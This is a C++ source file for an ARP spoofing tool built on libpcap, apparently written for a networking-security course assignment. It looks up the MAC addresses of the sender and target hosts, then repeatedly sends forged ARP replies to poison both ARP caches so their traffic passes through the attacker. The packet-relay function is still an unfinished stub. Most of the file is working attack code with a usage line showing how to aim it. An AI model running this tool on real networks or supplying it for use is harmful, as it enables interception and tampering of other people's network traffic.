#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <string>
#include <fstream>

#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <iostream>
#include <thread>

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <mutex>
#include <chrono>

std::mutex g_mutex_resolveMac;


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};

// my ipv4 header from pcap-test assginment.
typedef struct eIpv4Hdr_{
#if BYTE_ORDER == LITTLE_ENDIAN
	u_char IHL:4;
	u_char VER:4;
#else
	u_char VER:4;
	u_char IHL:4;
#endif
	uint8_t DSCP_ECN;
	uint16_t TOTAL_LEN;
	uint16_t ID;
	uint16_t FLAG_FRAGOFFSET;
	uint8_t TTL;
	uint8_t PROTOCOL;
	uint16_t HDR_CHKSUM;
	uint32_t SRC_IP_ADDR;
	uint32_t DST_IP_ADDR;
}eIpv4Hdr;

// my tcp header from pcap-test assginment.
typedef struct eTcpHdr_{
	uint16_t SRC_PORT;
	uint16_t DST_PORT;
	uint32_t SEQ_NUM;
	uint32_t ACK_NUM;
#if BYTE_ORDER == LITTLE_ENDIAN
	u_char FLAGS_RESERVED_NS:4;
	u_char DATA_OFFSET:4;
#else
	u_char DATA_OFFSET:4;
	u_char FLAGS_RESERVED_NS:4;
#endif
	uint8_t FLAGS_ETC:4;
	uint16_t WIN_SIZE;
	uint16_t CHKSUM;
	uint16_t URG_PTR;
}eTcpHdr;

// Eth && Ipv4 && Tcp packet structure.
struct eEthIpv4TcpPacket{
	EthHdr eth_;
	eIpv4Hdr eIpv4Hdr_;
	eTcpHdr eTcpHdr_;
};
#pragma pack(pop)


void usage();
Mac GetMyMac(const std::string deviceName_);
Mac GetTargetMac(const char* deviceName_, Mac myMac_, Ip myIp_);
Ip GetMyIp(std::string deviceName_);


void ResolveTargetMacSender(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
		return;
	}

	int cnt = 0;
	while (true)
	{
		usleep(1000);
g_mutex_resolveMac.lock();
		if(IpList_.size() == MacList_.size()){
			break;
		}
g_mutex_resolveMac.unlock();

		EthArpPacket pktArpReq;
		pktArpReq.eth_.smac_ = MyMac_;
		pktArpReq.eth_.dmac_ = Mac().broadcastMac();
		pktArpReq.eth_.type_ = htons(EthHdr::Arp);
		pktArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
		pktArpReq.arp_.pro_ = htons(EthHdr::Ip4);
		pktArpReq.arp_.hln_ = Mac::SIZE;
		pktArpReq.arp_.pln_ = Ip::SIZE;
		pktArpReq.arp_.op_ = htons(ArpHdr::Request);
		pktArpReq.arp_.smac_ = MyMac_;
		pktArpReq.arp_.sip_ = htonl(GetMyIp(deviceName_));	// I can use custom ip.
		pktArpReq.arp_.tmac_ = Mac().nullMac();
		pktArpReq.arp_.tip_ = htonl(IpList_.at(cnt++ % IpList_.size()));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpReq), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "@ResolveTargetMacSender @pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return;
		}
	}
g_mutex_resolveMac.unlock();
	return;
}


void ResolveTargetMacReceiver(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> IpList_, std::vector<Mac>& MacList_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
		return;
	}
	
	int cnt = 0;
	int res = 0;
	struct pcap_pkthdr* header;
	while (true)
	{
		usleep(0);
g_mutex_resolveMac.lock();
		if(IpList_.size() == MacList_.size()){
			break;
		}
g_mutex_resolveMac.unlock();

		// receive packet.
		const u_char* rawArpRep;
		res = pcap_next_ex(handle, &header, &rawArpRep);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return;
		}

		if (res == 0){
			// no captured packet.
			continue;
		}

		EthArpPacket* pktArpRep = (EthArpPacket*)rawArpRep;
		if (pktArpRep->eth_.type() != EthHdr::Arp){
			// not arp packet.
			continue;
		}
		if (pktArpRep->arp_.op() != ArpHdr::Reply){
			// not arp packet.
			continue;
		}

		if (Mac(pktArpRep->eth_.dmac_) != MyMac_){
			// get only packet sent to me.
			continue;
		}

		if (Ip(pktArpRep->arp_.sip()) == IpList_.at(cnt)){
g_mutex_resolveMac.lock();
			MacList_.push_back(Mac(pktArpRep->eth_.smac_));
g_mutex_resolveMac.unlock();
			cnt++;
		}
	}
g_mutex_resolveMac.unlock();
	return;
}


void SpoofWorker(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_,
 int period_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "@SpoofWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
		return;
	}
	
	if (!(SenderIpList_.size() == SenderMacList_.size()
	 && SenderMacList_.size() == TargetIpList_.size()
	 && TargetIpList_.size() == TargetMacList_.size())){
		fprintf(stderr, "@SpoofWorker: lise size error\n");
		return;
	}
	const size_t listSize = SenderIpList_.size();

	// sender <-> me.
	std::vector<EthArpPacket> pktArpRepInfectSenderList;
	for(int i = 0; i < listSize; i++){
		EthArpPacket pkt;
		pkt.eth_.smac_ = MyMac_;
		pkt.eth_.dmac_ = SenderMacList_.at(i);
		pkt.eth_.type_ = htons(EthHdr::Arp);
		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
		pkt.arp_.pro_ = htons(EthHdr::Ip4);
		pkt.arp_.hln_ = Mac::SIZE;
		pkt.arp_.pln_ = Ip::SIZE;
		pkt.arp_.op_ = htons(ArpHdr::Reply);
		pkt.arp_.smac_ = MyMac_;
		pkt.arp_.sip_ = htonl(TargetIpList_.at(i));
		pkt.arp_.tmac_ = SenderMacList_.at(i);
		pkt.arp_.tip_ = htonl(SenderIpList_.at(i));

		pktArpRepInfectSenderList.push_back(pkt);
	}

	// target <-> me.
	std::vector<EthArpPacket> pktArpRepInfectTargetList;
	for(int i = 0; i < listSize; i++){
		EthArpPacket pkt;
		pkt.eth_.smac_ = MyMac_;
		pkt.eth_.dmac_ = TargetMacList_.at(i);
		pkt.eth_.type_ = htons(EthHdr::Arp);
		pkt.arp_.hrd_ = htons(ArpHdr::ETHER);
		pkt.arp_.pro_ = htons(EthHdr::Ip4);
		pkt.arp_.hln_ = Mac::SIZE;
		pkt.arp_.pln_ = Ip::SIZE;
		pkt.arp_.op_ = htons(ArpHdr::Reply);
		pkt.arp_.smac_ = MyMac_;
		pkt.arp_.sip_ = htonl(SenderIpList_.at(i));
		pkt.arp_.tmac_ = TargetMacList_.at(i);
		pkt.arp_.tip_ = htonl(TargetIpList_.at(i));

		pktArpRepInfectTargetList.push_back(pkt);
	}

	// stupid method.
	int res = 0;
	while (true)
	{
		sleep(period_);
		for(int i = 0; i < listSize; i++){
			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&(pktArpRepInfectSenderList.at(i))), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
				return;
			}
			printf("%s -> %s\n", std::string(pktArpRepInfectSenderList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectSenderList.at(i).eth_.dmac()).c_str());

			res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpRepInfectTargetList.at(i)), sizeof(EthArpPacket));
			if (res != 0) {
				fprintf(stderr, "@SpoofWorker: pcap_sendpacket error=%s\n", pcap_geterr(handle));
				return;
			}
			printf("%s -> %s\n", std::string(pktArpRepInfectTargetList.at(i).eth_.smac()).c_str(), std::string(pktArpRepInfectTargetList.at(i).eth_.dmac()).c_str());
		}
	}
	return;
}


void RelayWorker(const char* deviceName_, Mac MyMac_,
 std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
 std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "@RelayWorker: pcap_open_live error=%s\n", pcap_geterr(handle));
		return;
	}
	
	if (!(SenderIpList_.size() == SenderMacList_.size()
	 && SenderMacList_.size() == TargetIpList_.size()
	 && TargetIpList_.size() == TargetMacList_.size())){
		fprintf(stderr, "@RelayWorker: list size error\n");
		return;
	}
	const size_t listSize = SenderIpList_.size();

	int res = 0;
	struct pcap_pkthdr* header;
	while (true)
	{
		sleep(0);
		const u_char* rawRecv;
		res = pcap_next_ex(handle, &header, &rawRecv);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("@RelayWorker: pcap_next_ex error=%s\n", res, pcap_geterr(handle));
			return;
		}

		EthHdr* ethHdr = (EthHdr*)rawRecv;
		if (ethHdr->type_ == EthHdr::Ip4){
			// capture Ipv4.
		}
		else if (ethHdr->type_ == EthHdr::Ip6){
			// drop Ipv6.
			continue;
		}
		else if (ethHdr->type_ == EthHdr::Arp){
			// drop ARP.
			continue;
		}

		
		
		const uint32_t pktSize = header->caplen;

		
	}
	return;
}


int main(int argc, char* argv[]) {
	std::cout << std::string(GetMyMac(argv[1])) << std::endl;
	std::cout << std::string(GetMyIp(argv[1])) << std::endl;
	if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// get my mac address.
	Mac MyMac(GetMyMac(argv[1]));
	if (MyMac.isNull()){
		fprintf(stderr, "couldn't get my mac address\n");
		return -1;
	}


	// count jobs.
	const int jobNum = (argc - 2) / 2;
	std::vector<Ip> senderIpList;
	std::vector<Mac> senderMacList;
	std::vector<Ip> targetIpList;
	std::vector<Mac> targetMacList;
	for(int i = 2; i < argc; i ++){
		if (i % 2 == 0){
			senderIpList.push_back(Ip(argv[i]));
			//senderMacList.push_back(GetTargetMac(dev, MyMac, Ip(argv[i])));
		}
		else{
			targetIpList.push_back(Ip(argv[i]));
			//targetMacList.push_back(GetTargetMac(dev, MyMac, Ip(argv[i])));
		}
	}

	std::thread ResolveMacThread1(ResolveTargetMacSender, dev, MyMac, senderIpList, std::ref(senderMacList));
	std::thread ResolveMacThread2(ResolveTargetMacReceiver, dev, MyMac, senderIpList, std::ref(senderMacList));
	ResolveMacThread1.join();
	ResolveMacThread2.join();

	std::thread ResolveMacThread3(ResolveTargetMacSender, dev, MyMac, targetIpList, std::ref(targetMacList));
	std::thread ResolveMacThread4(ResolveTargetMacReceiver, dev, MyMac, targetIpList, std::ref(targetMacList));
	ResolveMacThread3.join();
	ResolveMacThread4.join();



	std::cout << "senderIpList" << std::endl;
	for(int _ = 0; _ < senderIpList.size(); _++){
		std::cout << std::string(senderIpList.at(_)) << std::endl;
	}
	std::cout << "senderMacList" << std::endl;
	for(int _ = 0; _ < senderMacList.size(); _++){
		std::cout << std::string(senderMacList.at(_)) << std::endl;
	}
	std::cout << "targetIpList" << std::endl;
	for(int _ = 0; _ < targetIpList.size(); _++){
		std::cout << std::string(targetIpList.at(_)) << std::endl;
	}
	std::cout << "targetMacList" << std::endl;
	for(int _ = 0; _ < targetMacList.size(); _++){
		std::cout << std::string(targetMacList.at(_)) << std::endl;
	}

	std::thread SpoofThread(SpoofWorker, dev, MyMac, senderIpList, senderMacList, targetIpList, targetMacList, 1);
	SpoofThread.join();
	printf("@@\n");
	

	/*
	// loop to do jobs.
	for(int i = 0; i < jobNum; i++){
		std::string senderMac = GetTargetMac(dev, MyMac, senderIpList.at(i));
		if (senderMac == ""){
			fprintf(stderr, "couldn't get target MAC address\n");
			return -1;
		}
		printf("@main: senderIP=%s senderMAC=%s\n", senderIpList.at(i).c_str(), (senderMac).c_str());

		// generate malicious ARP rep packet.
		EthArpPacket packet;
		packet.eth_.dmac_ = Mac(senderMac);						// Sender MAC
		packet.eth_.smac_ = Mac(MyMac);							// My MAC
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);					// gen ARP rep packet.
		packet.arp_.smac_ = Mac(MyMac);							// My MAC
		packet.arp_.sip_ = htonl(Ip(targetIpList.at(i)));		// GW IP
		packet.arp_.tmac_ = Mac(senderMac);						// Sender MAC
		packet.arp_.tip_ = htonl(Ip(senderIpList.at(i)));		// Sender IP

		// poisoning sender ARP table.
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
		printf("@main: sent malicious arp reply packet to (%s, %s)\n", senderIpList.at(i).c_str(), (senderMac).c_str());
	}

	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("00:00:00:00:00:00");
	packet.eth_.smac_ = Mac("00:00:00:00:00:00");
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac("00:00:00:00:00:00");
	packet.arp_.sip_ = htonl(Ip("0.0.0.0"));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip("0.0.0.0"));

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	*/

	pcap_close(handle);
}


void usage() {
	printf("./arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}


/**
 * @brief Get my MAC address as Mac().
 * 
 * @param deviceName_ NIC deivce name.
 * @return Mac& my MAC object.
 * @details	read file /sys/class/net/[deviceName_]/address to get MAC address of NIC device.
 */
Mac GetMyMac(const std::string deviceName_){
	std::string filePath = "/sys/class/net/" + deviceName_ + "/address";

	std::ifstream ifr;
	ifr.open(filePath, std::ifstream::in);
	if (!ifr.is_open()){
		fprintf(stderr, "can't open file %s\n", filePath.c_str());
		return Mac().nullMac();
	}

	static std::string res;
	std::getline(ifr, res);
	ifr.close();
	Mac myMacAddr(res);
	
	return myMacAddr;
}


/**
 * @brief Get target MAC address as string.
 * 
 * @param deviceName_ NIC deivce name.
 * @param myIp_ target IP address.
 * @return std::string target MAC address.
 * 
 * @details	Send ARP req packet to target, get ARP rep packet,
 * 			and get target MAC address from ARP rep packet.
 * 			@pcap_setnonblock used.
 */
Mac GetTargetMac(const char* deviceName_, Mac myMac_, Ip myIp_){
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(deviceName_, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", deviceName_, errbuf);
		return nullptr;
	}

	EthArpPacket pktArpReq;
	pktArpReq.eth_.smac_ = myMac_;
	pktArpReq.eth_.dmac_ = Mac().broadcastMac();
	pktArpReq.eth_.type_ = htons(EthHdr::Arp);
	pktArpReq.arp_.hrd_ = htons(ArpHdr::ETHER);
	pktArpReq.arp_.pro_ = htons(EthHdr::Ip4);
	pktArpReq.arp_.hln_ = Mac::SIZE;
	pktArpReq.arp_.pln_ = Ip::SIZE;
	pktArpReq.arp_.op_ = htons(ArpHdr::Request);
	pktArpReq.arp_.smac_ = myMac_;
	pktArpReq.arp_.sip_ = htonl(myIp_);			// I can use custom ip.
	pktArpReq.arp_.tmac_ = Mac().nullMac();
	pktArpReq.arp_.tip_ = htonl(myIp_);

	std::cout << "@GetTargetMac Mac: " << std::string(myMac_) << std::endl;
	std::cout << "@GetTargetMac Ip: " << std::string(myIp_) << std::endl;
	int res = 0;
	struct pcap_pkthdr* header;
	pcap_setnonblock(handle, 1, errbuf);
	while (true)
	{
		sleep(0);
		// send normal ARP req packet.
		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pktArpReq), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			return nullptr;
		}

		// receive packet.
		const u_char* rawArpRep;
		res = pcap_next_ex(handle, &header, &rawArpRep);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			return nullptr;
		}

		if (res == 0){
			// no captured packet.
			continue;
		}

		EthArpPacket* pktArpRep = (EthArpPacket*)rawArpRep;
		if (pktArpRep->eth_.type() != EthHdr::Arp){
			// not arp packet.
			continue;
		}

		if (Mac(pktArpRep->eth_.dmac_) != myMac_){
			// get only packet sent to me.
			continue;
		}
		pcap_close(handle);

		// return target MAC address from ARP rep packet.
		return Mac(pktArpRep->arp_.smac_);
	}
}


Ip GetMyIp(std::string deviceName_){
    struct ifreq _ifr;
    int _socket = socket(AF_INET, SOCK_DGRAM, 0);
    _ifr.ifr_addr.sa_family = AF_INET;
    strncpy(_ifr.ifr_name , deviceName_.c_str() , IFNAMSIZ - 1);
    ioctl(_socket, SIOCGIFADDR, &_ifr);
    close(_socket);
    return Ip(htonl(((struct sockaddr_in *)&_ifr.ifr_addr)->sin_addr.s_addr));
}


